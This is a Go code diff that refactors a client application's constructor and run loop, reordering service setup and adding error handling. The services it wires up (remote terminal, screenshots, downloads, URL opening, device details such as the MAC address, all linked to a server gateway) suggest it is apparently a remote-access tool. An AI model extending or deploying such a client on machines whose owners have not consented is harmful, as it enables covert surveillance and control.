@@ -25,22 +25,13 @@ type App struct {
 }
 
 func New(configuration *environment.Configuration) *App {
-	infoService := information.NewService(configuration.Server.HttpPort)
-
-	deviceSpecs, err := infoService.LoadDeviceSpecs()
-	if err != nil {
-		log.Fatal("error loading device specs: ", err)
-	}
-
-	httpClient := network.NewHttpClient(10)
-
+	httpClient := network.NewHttpClient()
+	clientGateway := client.NewGateway(configuration, httpClient)
 	operatingSystem := os.DetectOS()
 	terminalService := terminal.NewService()
 
-	clientGateway := client.NewGateway(configuration, httpClient)
-
 	clientServices := &services.Services{
-		Information: infoService,
+		Information: information.NewService(configuration.Server.HttpPort),
 		Terminal:    terminalService,
 		Screenshot:  screenshot.NewService(),
 		Download:    download.NewService(configuration, clientGateway),
@@ -51,8 +42,14 @@ func New(configuration *environment.Configuration) *App {
 		URL:         url.NewURLService(terminalService, operatingSystem),
 	}
 
-	return &App{handler.NewHandler(
-		configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
+	deviceSpecs, err := clientServices.Information.LoadDeviceSpecs()
+	if err != nil {
+		log.Fatal("error loading device specs: ", err)
+	}
+
+	return &App{
+		handler.NewHandler(configuration, clientGateway, clientServices, deviceSpecs.MacAddress),
+	}
 }
 
 func (a *App) Run() {
@@ -68,5 +65,7 @@ func (a *App) Run() {
 		return nil
 	})
 
-	g.Wait()
+	if err := g.Wait(); err != nil {
+		log.Fatal("error running client: ", err)
+	}
 }
